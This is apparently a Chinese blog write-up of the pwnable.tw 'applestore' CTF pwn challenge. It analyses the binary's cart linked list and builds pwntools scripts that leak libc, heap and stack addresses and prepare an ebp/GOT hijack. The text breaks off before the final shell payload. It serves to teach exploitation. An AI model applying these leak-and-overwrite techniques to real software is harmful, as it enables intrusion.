---
title: 和媳妇一起学Pwn 之 applestore
date: 2020-03-06 00:00:00
categories:
- CTF/Pwn
tags: pwnable.tw matlab 劫持ebp 栈迁移 栈堆结合 未初始化变量
---

> 漏洞点是：本题预留了一个彩蛋，触发后可将一块栈内存的地址记录到堆上，并且可通过一些函数的输入控制这块栈内存。

> 利用方式：构造好这块栈内存后，再利用题目本身控制堆内存的一些函数便可以泄露内存数据，还可以完成有约束的地址写约束的数据。虽然因为约束关系使得直接修改GOT表后程序会崩溃，但可以通过修改栈上old_ebp内存为GOT表附近，函数leave时进而劫持栈底（ebp寄存器）到GOT表段，再通过题目本身的函数输入，控制栈内存，即控制GOT表，最终getshell。另外这题是只有malloc没有free，所以不用太关注堆本身的那套利漏洞问题和利用方法。

- 题目地址：[https://pwnable.tw/challenge/#7](https://pwnable.tw/challenge/#7)  
- 参考WP：[pwnable.tw系列](https://n0va-scy.github.io/2019/07/03/pwnable.tw/)

## 检查

```bash
➜   file applestore 
applestore: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=35f3890fc458c22154fbc1d65e9108a6c8738111, not stripped
➜   checksec applestore
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

题目基本信息：32位，动态链接，没去符号，没开PIE，GOT表可写，给了libc

## 分析

运行发现是菜单题，苹果的购物商店，有这些功能：列菜单，加入购物车，从购物车中删除，查看购物车，去收银台，退出

```bash
➜   ./applestore 
=== Menu ===
1: Apple Store
2: Add into your shopping cart
3: Remove from your shopping cart
4: List your shopping cart
5: Checkout
6: Exit
```
但尝试发现，挑好东西去收银台人家总不让我结账，总让我下次再结账：

```bash
=== Menu ===
1: Apple Store
2: Add into your shopping cart
3: Remove from your shopping cart
4: List your shopping cart
5: Checkout
6: Exit
> 2
Device Number> 1
You've put *iPhone 6* in your shopping cart.
Brilliant! That's an amazing idea.
> 5
Let me check your cart. ok? (y/n) > y
==== Cart ====
1: iPhone 6 - $199
Total: $199
Want to checkout? Maybe next time!
```

那好吧，我不买了，我还是IDA分析吧：

```asm
0x08048cb7 <+17>:	mov    DWORD PTR [esp],0xe
0x08048cbe <+24>:	call   0x80484c0 <signal@plt>
0x08048cc3 <+29>:	mov    DWORD PTR [esp],0x3c
0x08048cca <+36>:	call   0x80484d0 <alarm@plt>
```

发现main函数里有时间限制的方法，我们把这两个函数调用patch掉，然后继续分析：

### main

首先main函数会初始化一个全局变量myCart为0，这个变量位于bss段，大小为0x10，然后打印menu，然后进入handler函数

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  memset(&myCart, 0, 0x10u);
  menu();
  return handler();
}
```


### handler

handler函数会调用my_read函数，读取用户输入到栈上，大小为0x15字节。然后用户的输入将会被送入到atoi函数中转换为整型，说明my_read读到栈上的用户输入为ascii字符串，然后根据结果执行对应的功能

```c
unsigned int handler()
{
  char nptr; // [esp+16h] [ebp-22h]
  unsigned int v2; // [esp+2Ch] [ebp-Ch]

  v2 = __readgsdword(0x14u);
  while ( 1 )
  {
    printf("> ");
    fflush(stdout);
    my_read(&nptr, 0x15u);
    switch ( atoi(&nptr) )
    {
      case 1:
        list();
        break;
      case 2:
        add();
        break;
      case 3:
        delete();
        break;
      case 4:
        cart();
        break;
      case 5:
        checkout();
        break;
      case 6:
        puts("Thank You for Your Purchase!");
        return __readgsdword(0x14u) ^ v2;
      default:
        puts("It's not a choice! Idiot.");
        break;
    }
  }
}
```

### my_read

my_read函数除了调用read函数进行输入，做了基本的边界处理，在handler函数中，nptr与canary的变量v2相差0x16个字节，所以这里的最后补零不会破坏canary变量。

```c
char *__cdecl my_read(void *buf, size_t nbytes)
{
  char *result; // eax
  ssize_t v3; // [esp+1Ch] [ebp-Ch]

  v3 = read(0, buf, nbytes);
  if ( v3 == -1 )
    return (char *)puts("Input Error.");
  result = (char *)buf + v3;
  *((_BYTE *)buf + v3) = 0;
  return result;
}
```

### add

list函数没啥说的，就是一堆打印，我们直接看add函数，还是通过my_read函数往栈上的内存写用户的输入，然后用过atoi进行转换，然后调用了creat和insert函数完成了往购物的添加功能

```c
unsigned int add()
{
  _DWORD *v1; // [esp+1Ch] [ebp-2Ch]
  char nptr; // [esp+26h] [ebp-22h]
  unsigned int v3; // [esp+3Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  printf("Device Number> ");
  fflush(stdout);
  my_read(&nptr, 0x15u);
  switch ( atoi(&nptr) )
  {
    case 1:
      v1 = (_DWORD *)create("iPhone 6", 199);
      insert(v1);
      goto LABEL_8;
    case 2:
      v1 = (_DWORD *)create("iPhone 6 Plus", 299);
      insert(v1);
      goto LABEL_8;
    case 3:
      v1 = (_DWORD *)create("iPad Air 2", 499);
      insert(v1);
      goto LABEL_8;
    case 4:
      v1 = (_DWORD *)create("iPad Mini 3", 399);
      insert(v1);
      goto LABEL_8;
    case 5:
      v1 = (_DWORD *)create("iPod Touch", 199);
      insert(v1);
LABEL_8:
      printf("You've put *%s* in your shopping cart.\n", *v1);
      puts("Brilliant! That's an amazing idea.");
      break;
    default:
      puts("Stop doing that. Idiot!");
      break;
  }
  return __readgsdword(0x14u) ^ v3;
}
```

### create

create函数申请0x10的内存，实际返回的堆块大小为0x18，因为0x10大小的堆块最大存储用户数据为0xc，32位下再大一点的堆块大小就是0x18，可以存储的数据的空间为0x14，满足用户请求

```c
char **__cdecl create(int a1, char *a2)
{
  char **v2; // eax
  char **v3; // ST1C_4

  v2 = (char **)malloc(0x10u);
  v3 = v2;
  v2[1] = a2;
  asprintf(v2, "%s", a1);
  v3[2] = 0;
  v3[3] = 0;
  return v3;
}
```

可以看到，这里IDA给出的结果中，v2和v3其实是一个变量，所以可以在v3变量出点右键，选择`map to another variable`（快捷键=），选择v2，即可使得结果更好看：

```c
char **__cdecl create(int a1, char *a2)
{
  char **v2; // eax MAPDST

  v2 = (char **)malloc(0x10u);
  v2[1] = a2;
  asprintf(v2, "%s", a1);
  v2[2] = 0;
  v2[3] = 0;
  return v2;
}
```

create函数的第一个参数为手机名字的字符串常量，第二个参数为对应的手机价格。其中调用了asprintf这个函数，这个函数可以根据格式化字符串的最终结果长度自动的申请堆空间的内存，存放字符串，并且将字符串地址赋值给第一个参数。不过通过这种方式申请的堆空间需要用户手动释放。所以可以看到create函数，申请16字节的内存，前4个字节存放了asprintf自动申请，存储手机名的堆的地址，然后4个字节存放的是整型的手机价格，后面的8个字节都是0，用来做什么暂时不知道。返回值为堆块的数据部分的地址，然后add函数将这个地址传入到insert中

### insert

insert函数这个循环刚开始就看的有点迷糊，不过我们从开始的情景来推演就明白了这个循环是干嘛的了：

```c
int __cdecl insert(int a1)
{
  int result; // eax
  _DWORD *i; // [esp+Ch] [ebp-4h]

  for ( i = &myCart; i[2]; i = (_DWORD *)i[2] )
    ;
  i[2] = a1;
  result = a1;
  *(_DWORD *)(a1 + 12) = i;
  return result;
}
```

1. 第一次购买手机加入购物车时，myCart往后这0x10字节的内存（位于bss段）都是0。所以i就是myCart的地址，`i[2]`为0，跳出循环。然后将`i[2]`也就是`*(&myCart+2)`赋值为create返回的堆块的地址。然后将堆块偏移12即，堆块最后4个字节赋值为i，即&myCart。
2. 第二次购买手机加入购物车时，for循环第一次不跳出，因为上一次`i[2]`有值，为上一次create的堆块的地址，所以根据for的赋值语句，i赋值为上一个堆块的起始地址，然后将`i[2]`，也就是上一个堆块的第三个4字节赋值为当前堆块的首地址。最后将当前堆块的最后四个字节赋值为前一个堆块的首地址。
3. 以此类推，myCart是16个字节，每次create的堆块也是16个字节，insert相当于把每次添加进购物车的手机组织成一个不循环的双链表，每次添加一个手机就是往双链表最后添加一个节点，具体这个双链表的数据结构我们之后讨论

### delete

猜也猜到了，双链表的摘除，类似unlink

```c
unsigned int delete()
{
  signed int v1; // [esp+10h] [ebp-38h]
  _DWORD *v2; // [esp+14h] [ebp-34h]
  int v3; // [esp+18h] [ebp-30h]
  int v4; // [esp+1Ch] [ebp-2Ch]
  int v5; // [esp+20h] [ebp-28h]
  char nptr; // [esp+26h] [ebp-22h]
  unsigned int v7; // [esp+3Ch] [ebp-Ch]

  v7 = __readgsdword(0x14u);
  v1 = 1;
  v2 = (_DWORD *)dword_804B070;
  printf("Item Number> ");
  fflush(stdout);
  my_read(&nptr, 0x15u);
  v3 = atoi(&nptr);
  while ( v2 )
  {
    if ( v1 == v3 )
    {
      v4 = v2[2];
      v5 = v2[3];
      if ( v5 )
        *(_DWORD *)(v5 + 8) = v4;
      if ( v4 )
        *(_DWORD *)(v4 + 12) = v5;
      printf("Remove %d:%s from your shopping cart.\n", v1, *v2);
      return __readgsdword(0x14u) ^ v7;
    }
    ++v1;
    v2 = (_DWORD *)v2[2];
  }
  return __readgsdword(0x14u) ^ v7;
}
```

假如p为指向要删除的节点的指针，则内存的变化，可抽象的表示：

```c
p -> fd -> bk = p -> bk
p -> bk -> fd = p -> fd
```

加上这个节点本身的数据结构的条件，内存的变化即为：

```c
fd[3]=bk
bk[2]=fd
```

### cart

确认输入的是不是字符y，如果是，则遍历双链表打印购物车内容，返回购物车内商品总价格。这些能打印的函数，在题目中一般都可以用作信息泄露。

```c
int cart()
{
  signed int v0; // eax
  signed int v2; // [esp+18h] [ebp-30h]
  int v3; // [esp+1Ch] [ebp-2Ch]
  _DWORD *i; // [esp+20h] [ebp-28h]
  char buf; // [esp+26h] [ebp-22h]
  unsigned int v6; // [esp+3Ch] [ebp-Ch]

  v6 = __readgsdword(0x14u);
  v2 = 1;
  v3 = 0;
  printf("Let me check your cart. ok? (y/n) > ");
  fflush(stdout);
  my_read(&buf, 0x15u);
  if ( buf == 121 )
  {
    puts("==== Cart ====");
    for ( i = (_DWORD *)dword_804B070; i; i = (_DWORD *)i[2] )
    {
      v0 = v2++;
      printf("%d: %s - $%d\n", v0, *i, i[1]);
      v3 += i[1];
    }
  }
  return v3;
}
```

### checkout

调用cart，可以打印购物的的内容，然后如果总价格为7174，则可以将1美元的iphone8添加到购物车里，v2存储asprintf出来的字符串地址，v3为价格。

```c
unsigned int checkout()
{
  int v1; // [esp+10h] [ebp-28h]
  char *v2; // [esp+18h] [ebp-20h]
  int v3; // [esp+1Ch] [ebp-1Ch]
  unsigned int v4; // [esp+2Ch] [ebp-Ch]

  v4 = __readgsdword(0x14u);
  v1 = cart();
  if ( v1 == 7174 )
  {
    puts("*: iPhone 8 - $1");
    asprintf(&v2, "%s", "iPhone 8");
    v3 = 1;
    insert((int)&v2);
    v1 = 7175;
  }
  printf("Total: $%d\n", v1);
  puts("Want to checkout? Maybe next time!");
  return __readgsdword(0x14u) ^ v4;
}
```

然后调用insert传入v2变量的地址，不过注意之前双链表里存放的都是堆块，这次存了栈空间的地址上去，会不会有问题呢？不过首先是如何触发这个if呢，总价格达到7174，iphone的售价分别是199，299，399，499。所以这是一个多元一次方程求整数解，据说用z3非常好求解，不过没安装明白，最后还是用matlab求解的：

```python
>> [a,b,c,d]=ndgrid(0:100,0:100,0:100,0:100);
F=a*199+b*299+c*399+d*499;
ind=find(F(:)==7174);
[a(ind) b(ind) c(ind) d(ind)]

ans =

     6    20     0     0
     7    18     1     0
     8    16     2     0
     9    14     3     0
    10    12     4     0
>> 
```

解出一堆整数解，这里有所省略


## 数据结构

本题设计了一个双链表，每个链表的节点是16字节，存在4个元素，分别为手机名字的字符串地址(&name)，手机价格(price)，链表前向指针(fd)，链表后向指针(bk)，理解这个数据结构是明白本题的关键。当已经加入了一些手机到购物车后，myCart这个位于bss段的节点，充当双链表的表头，其后的节点均为堆空间的内存块：


![image](https://xuanxuanblingbling.github.io/assets/pic/applestore/mycart.png)


然后是主要用到这个数据结构的几个函数：

- add: 完成双链表节点的插入
- delete: 完成双链表节点的删除
- cart: 完成双链表节点的遍历，打印每个节点的第一个元素指向的字符串
- checkout: 可以完成双链表节点的遍历，触发彩蛋可以完成一次双链表节点的插入，而且节点位于栈上

## 漏洞点

刚才看到在checkout触发彩蛋后，可以添加一个栈上的内存空间，到购物车双链表中，我们先来尝试一下，在本地触发一次这个彩蛋，采用matlab算出的第一个解买6个199的，买20个299的：

```python
from pwn import *
context(arch='i386',os='linux',log_level='debug')
myelf = ELF('applestore')
io = process(myelf.path)

add = '2';delete='3';cart='4';checkout='5'
def action(num,payload):
        io.sendlineafter('> ',num)
        io.sendlineafter('> ',payload)

for i in range(6):
        action(add,'1')
for i in range(20):
        action(add,'2')
action(checkout,'y')

io.recv()
io.interactive()
```

执行一下可以发现，的确触发了：

```c
'18: iPhone 6 Plus - $299\n'
'19: iPhone 6 Plus - $299\n'
'20: iPhone 6 Plus - $299\n'
'21: iPhone 6 Plus - $299\n'
'22: iPhone 6 Plus - $299\n'
'23: iPhone 6 Plus - $299\n'
'24: iPhone 6 Plus - $299\n'
'25: iPhone 6 Plus - $299\n'
'26: iPhone 6 Plus - $299\n'
'*: iPhone 8 - $1\n'
```
在脚本最后采用`io.interactive()`，我们可以继续跟程序交互，再次执行4号选项，即打印购物车列表，发现程序崩溃了：

```bash
26: iPhone 6 Plus - $299
27: WVS\x83�D$\x1c\x8bL$\x18f\x83x\x0e - $-137035168
[*] Process '/mnt/hgfs/pwn/pwnable/applestore/applestore' stopped with exit code -11 (SIGSEGV) (pid 54135)
[*] Got EOF while reading in interactive
```

这其实是因为，我们加入到链表中的栈地址的iphone8的数据已经失效了，这段栈空间被其他的函数所利用，所以是失效的数据，在执行cart的过程中，需要访问每一个节点的第一个元素所指向的地址，如果是错误的数据，很有可能这个地址处于不可访问的内存，导致程序崩溃。这也就是本题的漏洞所在！

## 利用

本题的精髓都在利用上了，这个利用真是太巧妙了。

### 栈平衡与计算

以往我们熟悉的栈操作都是在一个函数内，比如函数内的局部变量距离ebp的偏移，直接用IDA看就可以了。但是如果出了这个函数后，这个未清空的原来的变量的栈地址，被别的函数利用了，这里有三个问题：

1. 原来的变量距离现在的ebp的偏移是确定的么？
2. 如果是，这个偏移和距离原来ebp的偏移是相同的么？
3. 如果偏移不同，这个偏移怎么计算？

这三个问题都需要确定程序当前所在的函数，而且真的想要好好回答这个问题，那么一切就要从栈帧说起

#### 栈帧

关于栈帧的界定有两种说法：

![image](https://xuanxuanblingbling.github.io/assets/pic/applestore/stack.png)

- 栈帧包括当前函数的参数，不包括所调用函数的参数
- 栈帧不包括当前函数的参数，包括所调用函数的参数

第二种说法比较常见，不过我更赞同第一种（上图是左侧是超哥的课件），因为但从一个时刻的状态来看，的确第二种更合理。但是如果函数的调用过程来看，从被调函数回到了调用者函数后，被调函数的参数一定会被平衡，无论这个平衡是由被调函数还是调用者函数做的。所以当被调用函数完全消失时，当前栈的状态恢复成没有压被调函数的参数时的状态，然后调用者函数可能继续去调用其他函数。所以从这个角度来看，栈帧包括当前函数的参数是更加合理的。所以之后的讨论均采用第一种说法，即栈帧包括当前函数的参数，不包括所调用函数的参数。并且以下讨论不包括调用alloca函数再栈上动态申请内存。我们假设如下情景：无参数的func1，分别调用有一个参数的fun2，有一个参数的fun3，有两个参数的fun4，在调用过程中栈帧的变化如下，图中P标记的含义为一个参考地址，固定不动的一个地址：

![image](https://xuanxuanblingbling.github.io/assets/pic/applestore/func.png)

如果看明白了这个调用过程，便可以清晰的回答上面三个问题

#### 问题的答案

![image](https://xuanxuanblingbling.github.io/assets/pic/applestore/frame.png)

1. 无论在哪个函数中，原来的变量如func2 local var，在以上5中情况中，均距离当前的ebp的偏移时固定的，可计算的。
2. 这个偏移和距离原来的ebp的偏移不一定相同，例如在第2，4，5，情况中不同，在3情况中相同。
3. 可以根据函数调用关系以及函数参数所占用空间进行计算。例如fun3与fun2被fun1的调用关系一致，fun3与fun2均只有一个参数，且fun1在调用fun3和fun2之前没有进行奇怪的栈操作，则原来变量距离ebp的偏移和距离现在ebp的偏移相同。


#### 本题的栈帧

可以看一下handler函数的汇编：

```asm
.text:08048C31                 jmp     eax             ; switch jump
.text:08048C33 ; ---------------------------------------------------------------------------
.text:08048C33
.text:08048C33 loc_8048C33:                            ; CODE XREF: handler+5E↑j
.text:08048C33                                         ; DATA XREF: .rodata:08049088↓o
.text:08048C33                 call    list            ; jumptable 08048C31 case 1
.text:08048C38                 jmp     short loc_8048C63
.text:08048C3A ; ---------------------------------------------------------------------------
.text:08048C3A
.text:08048C3A loc_8048C3A:                            ; CODE XREF: handler+5E↑j
.text:08048C3A                                         ; DATA XREF: .rodata:08049088↓o
.text:08048C3A                 call    add             ; jumptable 08048C31 case 2
.text:08048C3F                 jmp     short loc_8048C63
.text:08048C41 ; ---------------------------------------------------------------------------
.text:08048C41
.text:08048C41 loc_8048C41:                            ; CODE XREF: handler+5E↑j
.text:08048C41                                         ; DATA XREF: .rodata:08049088↓o
.text:08048C41                 call    delete          ; jumptable 08048C31 case 3
.text:08048C46                 jmp     short loc_8048C63
.text:08048C48 ; ---------------------------------------------------------------------------
.text:08048C48
.text:08048C48 loc_8048C48:                            ; CODE XREF: handler+5E↑j
.text:08048C48                                         ; DATA XREF: .rodata:08049088↓o
.text:08048C48                 call    cart            ; jumptable 08048C31 case 4
.text:08048C4D                 jmp     short loc_8048C63
.text:08048C4F ; ---------------------------------------------------------------------------
.text:08048C4F
.text:08048C4F loc_8048C4F:                            ; CODE XREF: handler+5E↑j
.text:08048C4F                                         ; DATA XREF: .rodata:08049088↓o
.text:08048C4F                 call    checkout        ; jumptable 08048C31 case 5
.text:08048C54                 jmp     short loc_8048C63
.text:08048C56 ; ---------------------------------------------------------------------------
```

故进入每一个函数时，hander的栈帧是相同的，且这几个函数均没有参数，所以进入这些函数后，ebp寄存器的值也全部相同，即如果存在未初始化或者未清空的局部变量，则这个局部变量距离每一个函数的ebp的偏移均相等。

#### 未清空数据的利用






### 泄露libc基址和heap段地址

有了这个漏洞能控制构造一个伪造的节点，我们能做些什么呢？首先一般是信息泄露，本题我们可以首先泄露libc基址，以及堆段的地址。不过泄露有啥用呢？暂时看不出来。我们通过cart函数便可以打印双链表的一些数据，并且我们控制第27个节点，即栈上的内存。我们可以构造如下节点：

- 前四个字节为漏洞程序的GOT表中一项的地址
- 再四个字节随意
- 再四个字节为&myCart+2，即0x804B070
- 最后四个字节随意

即：`payload = 'y\x00'+p32(myelf.got['puts'])+p32(1)+p32(0x0804B070)+p32()`，如图的stack节点，构造完之后的链表结构如下，bk回边未画出：

```
                   stack                          bss                            heap


           +--------------------+        +--------------------+         +--------------------+
           |                    |        |                    |         |                    |
     +---->+   ELF.GOT['puts']  |        |      myCart        |    +--->+      &name         |    +---->
     |     |                    |        |                    |    |    |                    |    |
     |     +--------------------+        +--------------------+    |    +--------------------+    |
     |     |                    |        |                    |    |    |                    |    |
     |     |                    |        |                    |    |    |                    |    |
     |     |                    |        |                    |    |    |                    |    |
     |     +--------------------+        +--------------------+    |    +--------------------+    |
     |     |                    |        |                    |    |    |                    |    |
+----+     |   &myCart + 2      +-------->        fd          +----+    |       fd           +----+
           |                    |        |                    |         |                    |
           +--------------------+        +--------------------+         +--------------------+
           |                    |        |                    |         |                    |
           |                    |        |                    |         |       bk           |
           |                    |        |                    |         |                    |
           +--------------------+        +--------------------+         +--------------------+
                                         |                    |
                                         |   fake fd (null)   |
                                         |                    |
                                         +--------------------+
                                         |                    |
                                         |                    |
                                         |                    |
                                         +--------------------+
```

构造如上节点后，cart函数在遍历打印的时候，遍历到第27个节点时，就会按照我们构造的数据去执行打印，并继续遍历，所以就会把`ELF.GOT['puts']`地址处的内容打印出来，在减去libc中puts函数的偏移就能泄露出来libc的基址。在继续遍历的时候就会将`&myCart + 2`的地址处识别为一个节点的开头，然后打印这个节点第一个元素所指向的内存，作为第28个节点的打印数据。这个指针本身是指向第一个节点，所以我们就会把第1个节点的数据打印出来直到遇到0x00。第1个节点的前四个字节是asprintf出来的堆块的地址，存储着iphone6这类的字符串。这个地址和堆空间其起始的地址偏移是固定的，所以我们也可以泄露出来堆段的地址。但是我们不知道偏移的具体大小，需要调试，这里我们需要使用本地的libc的信息，32位的一般位于`/lib/i386-linux-gnu/libc.so.6`：


```python
from pwn import *
context(arch='i386',os='linux',log_level='debug')
myelf = ELF('applestore')
libc = ELF('../../my_ubuntu32_libc.so')
io = process(myelf.path)

add = '2';delete='3';cart='4';checkout='5'

def action(num,payload):
        io.sendlineafter('> ',num)
        io.sendlineafter('> ',payload)
for i in range(6):
        action(add,'1')
for i in range(20):
        action(add,'2')
action(checkout,'y')

payload = 'y\x00'+p32(myelf.got['puts'])+p32(1)+p32(0x0804B070)+p32(1)
action(cart,payload)

io.recvuntil('27: ')
libc_addr = u32(io.recv(4))-libc.symbols['puts']
io.recvuntil('28: ')
heap_addr = u32(io.recv(4))

log.warn('libc_addr: 0x%x' % libc_addr)
log.warn('heap_addr: 0x%x' % heap_addr)

gdb.attach(io,"b * 0x8048beb")
io.interactive()
```

打印出来的地址如下：

```python
[!] libc_addr: 0xf7de2000
[!] heap_addr: 0x9ffe490
```
然后在gdb的调试窗口里通过vmmap命令查看libc起始地址，我们的计算正确：

```python
gef➤  vmmap
Start      End        Offset     Perm Path
0xf7de2000 0xf7f92000 0x00000000 r-x /lib/i386-linux-gnu/libc-2.23.so
```

然后查看堆块的地址，第一个堆块的数据地址为0x09ffe008，32位下减去8字节的heap header，所以堆空间的起始地址就是0x09ffe000

```python
gef➤  heap chunks
Chunk(addr=0x9ffe008, size=0x408, flags=PREV_INUSE)
    [0x09ffe008     3e 20 3a 20 90 e4 ff 09 c7 20 2d 20 24 30 0a 08 
```

故我们泄露出的地址0x9ffe490比堆空间的起始地址多了0x490的偏移，故修正堆的地址：

```python
io.recvuntil('27: ')
libc_addr = u32(io.recv(4)) - libc.symbols['puts']
io.recvuntil('28: ')
heap_addr = u32(io.recv(4)) - 0x490
```

至于这个偏移为啥是固定的，我认为应该是程序每次的堆操作都是固定的，所以偏移也是固定的。这个偏移中还存在着asprintf的堆操作，所以不同版本的libc可能偏移时不同的，但是同一个libc下应该是固定的。

### 泄露栈地址

有了堆段的地址后，我们还可以泄露出当前栈的地址（目前还是不知道为什么要泄露栈地址，反正一顿泄露就对了），因为第26个节点的fd存放的就是第27个节点的地址，所以我们只要找到第26个节点的fd的地址，然后再次利用cart函数即可泄露出栈地址。我们继续在刚刚的gdb窗口中按c，然后在和程序交互输入1，即可断到设置的断点(0x8048beb)上，然后查看esp和ebp，以及观察堆上的chunks：

```python
gef➤  heap chunks
...
Chunk(addr=0x9ffe8a8, size=0x18, flags=PREV_INUSE)
    [0x09ffe8a8     c0 e8 ff 09 2b 01 00 00 28 32 cc ff 90 e8 ff 09    ....+...(2......]
Chunk(addr=0x9ffe8c0, size=0x18, flags=PREV_INUSE)
    [0x09ffe8c0     69 50 68 6f 6e 65 20 36 20 50 6c 75 73 00 00 00    iPhone 6 Plus...]
Chunk(addr=0x9ffe8d8, size=0x10, flags=PREV_INUSE)
    [0x09ffe8d8     69 50 68 6f 6e 65 20 38 00 00 00 00 29 00 00 00    iPhone 8....)...]
Chunk(addr=0x9ffe8e8, size=0x28, flags=PREV_INUSE)
    [0x09ffe8e8     b0 47 f9 f7 b0 47 f9 f7 00 00 00 00 11 07 02 00    .G...G..........]
Chunk(addr=0x9ffe910, size=0x18, flags=)
    [0x09ffe910     69 50 68 6f 6e 65 20 36 20 50 6c 75 73 00 00 00    iPhone 6 Plus...]
Chunk(addr=0x9ffe928, size=0x206e0, flags=PREV_INUSE)  ←  top chunk
gef➤  p $esp
$5 = (void *) 0xffcc3250
gef➤  p $ebp
$6 = (void *) 0xffcc3288
```

可以看到0x9ffe8a8这个堆块的第3个4字节处为0xffcc3228，位于栈空间，这个位置为0x9ffe8a8+0x8=0x9ffe8b0，距离堆段的偏移为：0x9ffe8b0-0x9ffe000=0x8b0，故我们构造堆段起始地址heap_adrr+0x8b0为payload，即可泄露位于栈空间的第27个节点的地址：

```python
from pwn import *
context(arch='i386',os='linux',log_level='debug')
myelf = ELF('applestore')
libc = ELF('../../my_ubuntu32_libc.so')
io = process(myelf.path)

add = '2';delete='3';cart='4';checkout='5'

def action(num,payload):
        io.sendlineafter('> ',num)
        io.sendlineafter('> ',payload)
for i in range(6):
        action(add,'1')
for i in range(20):
        action(add,'2')
action(checkout,'y')

payload = 'y\x00'+p32(myelf.got['puts'])+p32(1)+p32(0x0804B070)+p32(1)
action(cart,payload)

io.recvuntil('27: ')
libc_addr = u32(io.recv(4))-libc.symbols['puts']
io.recvuntil('28: ')
heap_addr = u32(io.recv(4))-0x490

payload = 'y\x00'+p32(heap_addr+0x8b0)+p32(1)+p32(0x0804B070)+p32(1)
action(cart,payload)
io.recvuntil('27: ')
stack_addr = u32(io.recv(4))

log.warn('libc_addr: %x' % libc_addr)
log.warn('heap_addr: %x' % heap_addr)
log.warn('stack_addr: %x' % stack_addr)

gdb.attach(io,"b * 0x8048beb")
io.interactive()
```

### delete一次有约束的地址写

之前提到了在delete时存在一次内存写操作，假如p为指向要删除的节点的指针，则内存的变化，可抽象的表示：

```c
p -> fd -> bk = p -> bk
p -> bk -> fd = p -> fd
```

加上这个节点本身的数据结构的条件，内存的变化即为：

```c
fd[3]=bk
bk[2]=fd
```

第27个节点的数据是完全可控的，即delete的时候fd，bk。现在我们已知了libc基址，堆段起始地址，栈地址。我们可以做什么？我是否可以只利用泄露出的libc基址，然后将GOT的某项覆盖为libc中system函数的地址呢？例如：当delete执行完之后还要回到handler函数，输入后会执行atoi函数，我希望把`GOT['atoi']`换成`libc_base+libc.symbols['system']`，即把GOT表中的atoi的表项换成libc中的system函数的地址即：

```c
* atoi@got = system@libc
```

为满足上面的约束条件可以有两种情况：

```python
(第一种)
令: fd[3] = * atoi@got , bk = system@libc
即: fd + 0xc = atoi@got , bk = system@libc
即: fd = atoi@got - 0xc , bk = system@libc
故: fd[3] = bk , 即完成* atoi@got = system@libc赋值操作

但: bk[2] = * (system@libc + 2)
若: bk[2] = fd , 进行赋值
则: * (system@libc + 2) = atoi@got - 0xc，即对libc中的system函数进行写操作，代码段是只读的，程序会崩溃


(第二种)
令: bk[2] = * atoi@got , fd = system@libc
即: bk + 0x8 = atoi@got , fd = system@libc
即: bk = atoi@got - 0x8 , fd = system@libc
故: bk[2] = fd , 即完成* atoi@got = system@libc赋值操作

但: fd[3] = * (system@libc + 3)
若: fd[3] = bk , 进行赋值
则: * (system@libc + 3) = atoi@got - 0x8，即对libc中的system函数进行写操作，代码段是只读的，程序会崩溃
```

所以通过delete是不能直接去修改GOT表的，两种情况下都会使得程序崩溃。而且，对于这种约束的内存写是无法直接修改间接跳转处为我们利用的函数地址，因为对于我们要利用的函数地址，其+2或者+3的处的地址一定是只读的。所以理论上没有可读可写可执行的代码段，我们没有办法直接利用这种有约束的内存写来劫持程序流。所以我们现在知道了栈内存地址，也就能计算出delete函数的返回地址，不过因为上述原因，我们往返回地址写利用的函数地址，一定也会崩溃的。那么我们还能怎么办呢？

### 劫持ebp并覆盖GOT表

之前说过，二进制漏洞利用的过程，就是一步步扩大可以控制的内存的范围。我们现在可以控制的内存或者说可以写的内存，有两部分：

1. 进入一些函数时的部分栈空间
2. 整个内存中满足上述约束的内存

那其实我们的思路就是利用满足约束条件的内存，即部分二的内存，配合相应程序逻辑，进而扩大部分一。

具体来说，部分一的内存空间是由进入函数后栈空间，而且本题可控的栈内存是根据进入函数的ebp寄存器进行寻址。而ebp寄存器会在函数leave时，恢复为栈中之前保存的old_ebp，如果我们能想办法修改old_ebp，则可能在delete函数返回到handler函数后，控制栈的基址。如果我们将栈的基址劫持到GOT表附近，则可能通过输入控制栈，即控制GOT表，最终实现控制流劫持。

#### 劫持ebp

那我们先来尝试劫持ebp到GOT表底部（因为栈是由高地址向低地址增长，ebp是栈底）。我们是通过delete函数满足约束条件的去写old_ebp，为GOT表的地址。首先想到GOT表位于可写的段，所以GOT表+2,+3的地址是data段，也是可写的，并不会崩溃，条件成立。那我们首先需要知道在delete函数返回前old_ebp的地址，泄我们露出的第27个节点的地址，在checkout函数中，距离当时的ebp的偏移为-0x20。根据本题的栈平衡，进入delete函数后，这个第27个节点的地址距离ebp的偏移仍然是-0x20，即old_ebp所在的内存位置为泄露出的栈地址+0x20。所以我们尝试将断点断在泄露完栈地址后的delete函数中，然后触发delete方法看看：

```python
from pwn import *
context(arch='i386',os='linux',log_level='debug')
myelf = ELF('applestore')
libc = ELF('../../my_ubuntu32_libc.so')
io = process(myelf.path)
# libc = ELF("./libc_32.so.6")
# io = remote("chall.pwnable.tw",10104)

add = '2';delete='3';cart='4';checkout='5'

def action(num,payload):
        io.sendlineafter('> ',num)
        io.sendlineafter('> ',payload)
for i in range(6):
        action(add,'1')
for i in range(20):
        action(add,'2')
action(checkout,'y')

payload = 'y\x00'+p32(myelf.got['puts'])+p32(1)+p32(0x0804B070)+p32(1)
action(cart,payload)

io.recvuntil('27: ')
libc_addr = u32(io.recv(4))-libc.symbols['puts']
io.recvuntil('28: ')
heap_addr = u32(io.recv(4))-0x490

payload = 'y\x00'+p32(heap_addr+0x8b0)+p32(1)+p32(0x0804B070)+p32(1)
action(cart,payload)
io.recvuntil('27: ')
stack_addr = u32(io.recv(4)) 
ebp = stack_addr + 0x20

log.warn('libc_addr: 0x%x' % libc_addr)
log.warn('heap_addr: 0x%x' % heap_addr)
log.warn('stack_addr: 0x%x' % stack_addr)
log.warn('ebp: 0x%x' % ebp)

gdb.attach(io,"b * 0x080489C0 \nc \np $ebp")
action(delete,"1")
io.interactive()
```

打印结果为：

```
[!] libc_addr: 0xf7dca000
[!] heap_addr: 0x8be7000
[!] stack_addr: 0xff851e78
[!] ebp: 0xff851e98
```

gdb结果：

```c
[#0] 0x80489c0 → delete()
[#1] 0x8048c46 → handler()
